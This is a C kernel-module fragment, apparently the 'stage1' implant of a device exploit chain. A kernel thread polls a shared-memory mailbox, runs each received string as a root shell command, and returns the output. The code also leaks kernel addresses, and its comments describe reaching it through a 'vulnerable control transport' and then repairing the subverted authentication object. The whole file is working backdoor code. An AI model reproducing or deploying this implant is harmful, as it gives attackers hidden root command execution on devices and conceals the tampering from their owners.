/*
 * Command mailbox: direct BSS polling for fast execution
 */

#define CMD_INBUF_SIZE   512
#define CMD_OUTBUF_SIZE  65536
#define S1_MAILBOX_MAGIC 0x3158424d31565350ULL
#define S1_MAILBOX_ABI   1

/*
 * Versioned discovery record for direct-memory clients.  The previous host
 * relied on incidental BSS offsets; this record makes the mailbox ABI
 * independent of function and variable reordering.
 */
struct s1_mailbox_descriptor {
    u64 magic;
    u16 abi_version;
    u16 firmware;
    u32 descriptor_size;
    u32 status_capacity;
    u32 command_capacity;
    u32 output_capacity;
    u32 reserved;
    u64 status;
    u64 cmd_in;
    u64 cmd_in_len;
    u64 cmd_out;
    u64 cmd_out_len;
    u64 cmd_seq;
    u64 cmd_ret;
};

static struct s1_mailbox_descriptor mailbox_descriptor = {
    .magic = S1_MAILBOX_MAGIC,
    .abi_version = S1_MAILBOX_ABI,
    .firmware = S1_FW_VERSION,
    .descriptor_size = sizeof(struct s1_mailbox_descriptor),
    .status_capacity = STATUS_SIZE,
    .command_capacity = CMD_INBUF_SIZE,
    .output_capacity = CMD_OUTBUF_SIZE,
};

static char cmd_in_buf[CMD_INBUF_SIZE] __attribute__((aligned(8)));
static volatile unsigned long cmd_in_len;    /* set by host, cleared by kthread */

static char cmd_out_buf[CMD_OUTBUF_SIZE] __attribute__((aligned(8)));
static volatile unsigned long cmd_out_len;   /* set by kthread after exec */
static volatile unsigned long cmd_seq;       /* incremented on each completion */
static volatile long cmd_ret;                /* call_usermodehelper result */

static struct task_struct *cmd_thread;

static bool s1_executable_file(const char *path)
{
    struct file *fp;
    struct inode *inode;
    bool executable;

    fp = filp_open(path, O_RDONLY, 0);
    if (IS_ERR(fp))
        return false;

    inode = file_inode(fp);
    executable = inode && S_ISREG(inode->i_mode) &&
                 (inode->i_mode & 0111);
    filp_close(fp, NULL);
    return executable;
}

static const char *s1_command_shell(bool *busybox)
{
    static const char * const candidates[] = {
        "/data/modules/busybox",
        "/tmp/busybox",
    };
    size_t index;

    for (index = 0; index < ARRAY_SIZE(candidates); ++index) {
        if (!s1_executable_file(candidates[index]))
            continue;
        *busybox = true;
        return candidates[index];
    }

    *busybox = false;
    return "/bin/sh";
}

/* Command worker: poll cmd_in_len, execute, and store output */
static int cmd_thread_fn(void *data)
{
    (void)data;

    while (!kthread_should_stop()) {
        unsigned long requested = READ_ONCE(cmd_in_len);

        if (requested > 0) {
            char cmd_copy[CMD_INBUF_SIZE];
            char wrapped[CMD_INBUF_SIZE + 64];
            unsigned long len = requested;
            int ret;

            /* Copy and acknowledge */
            if (len >= CMD_INBUF_SIZE)
                len = CMD_INBUF_SIZE - 1;
            memcpy(cmd_copy, cmd_in_buf, len);
            cmd_copy[len] = '\0';
            smp_mb();
            WRITE_ONCE(cmd_in_len, 0);  /* acknowledge receipt */

            /* Strip trailing newline */
            while (len > 0 && (cmd_copy[len-1] == '\n' || cmd_copy[len-1] == '\r'))
                cmd_copy[--len] = '\0';

            /* Wrap: redirect stdout+stderr to temp file */
            /*
             * Group the requested command before capturing its output.
             * Appending a redirection directly to cmd_copy would override a
             * caller's own trailing redirection, e.g. writes to /proc/stage1.
             */
            snprintf(wrapped, sizeof(wrapped),
                     "( %s ) > /tmp/.s1out 2>&1", cmd_copy);

            /* Execute synchronously (we're in process context) */
            {
                bool busybox;
                const char *shell = s1_command_shell(&busybox);
                char *busybox_argv[] = {
                    (char *)shell, "ash", "-c", wrapped, NULL
                };
                char *system_argv[] = {
                    (char *)shell, "-c", wrapped, NULL
                };
                char *envp[] = {
                    "HOME=/",
                    "PATH=/data/modules:/tmp:/tmp/bin:"
                    "/bin:/sbin:/usr/bin:/usr/sbin",
                    NULL
                };
                char **argv = busybox ? busybox_argv : system_argv;

                ret = call_usermodehelper(argv[0], argv, envp,
                                         UMH_WAIT_PROC);
            }

            /* Read output file into cmd_out_buf */
            {
                struct file *fp = filp_open("/tmp/.s1out",
                                            O_RDONLY, 0);
                if (!IS_ERR(fp)) {
                    typedef int (*kr_fn_t)(struct file *, loff_t,
                                           char *, unsigned long);
                    int nread = ((kr_fn_t)kernel_read)(
                        fp, 0, cmd_out_buf, CMD_OUTBUF_SIZE - 1);
                    if (nread < 0)
                        nread = 0;
                    cmd_out_buf[nread] = '\0';
                    WRITE_ONCE(cmd_out_len, nread);
                    filp_close(fp, NULL);
                } else {
                    WRITE_ONCE(cmd_out_len, 0);
                    cmd_out_buf[0] = '\0';
                }
            }

            /* Publish all results before changing the sequence observed by
             * direct-memory mailbox clients. */
            WRITE_ONCE(cmd_ret, ret);
            smp_wmb();
            WRITE_ONCE(cmd_seq, READ_ONCE(cmd_seq) + 1);
            /*
             * The host reads the result through the vulnerable control
             * transport.  Repair the authentication object after those
             * final reads have drained instead of racing them here.
             */
            if (!s1_auth_reflection_is_armed())
                s1_schedule_auth_repair(250);
        }

        msleep(10);
    }

    return 0;
}

static int s1_mailbox_start(void)
{
    BUILD_BUG_ON(sizeof(struct s1_mailbox_descriptor) != 88);
    BUILD_BUG_ON(offsetof(struct s1_mailbox_descriptor, status) != 32);
    BUILD_BUG_ON(offsetof(struct s1_mailbox_descriptor, cmd_ret) != 80);

    memset(cmd_in_buf, 0, CMD_INBUF_SIZE);
    memset(cmd_out_buf, 0, CMD_OUTBUF_SIZE);
    WRITE_ONCE(cmd_in_len, 0);
    WRITE_ONCE(cmd_out_len, 0);
    WRITE_ONCE(cmd_seq, 0);
    WRITE_ONCE(cmd_ret, -1);

    mailbox_descriptor.status = (u64)(unsigned long)status_buf;
    mailbox_descriptor.cmd_in = (u64)(unsigned long)cmd_in_buf;
    mailbox_descriptor.cmd_in_len = (u64)(unsigned long)&cmd_in_len;
    mailbox_descriptor.cmd_out = (u64)(unsigned long)cmd_out_buf;
    mailbox_descriptor.cmd_out_len = (u64)(unsigned long)&cmd_out_len;
    mailbox_descriptor.cmd_seq = (u64)(unsigned long)&cmd_seq;
    mailbox_descriptor.cmd_ret = (u64)(unsigned long)&cmd_ret;
    smp_wmb();

    cmd_thread = kthread_run(cmd_thread_fn, NULL, "stage1_cmd");
    if (IS_ERR(cmd_thread)) {
        int error = (int)PTR_ERR(cmd_thread);

        cmd_thread = NULL;
        return error;
    }
    return 0;
}

static void s1_mailbox_stop(void)
{
    if (cmd_thread) {
        kthread_stop(cmd_thread);
        cmd_thread = NULL;
    }
}

static void s1_mailbox_publish_ready(void)
{
    snprintf(status_buf, STATUS_SIZE,
             "OK ready mailbox=%px status=%px cmd_in=%px "
             "cmd_in_len=%px cmd_out=%px cmd_out_len=%px "
             "cmd_seq=%px cmd_ret=%px",
             &mailbox_descriptor, status_buf, cmd_in_buf, &cmd_in_len,
             cmd_out_buf, &cmd_out_len, &cmd_seq, &cmd_ret);
}
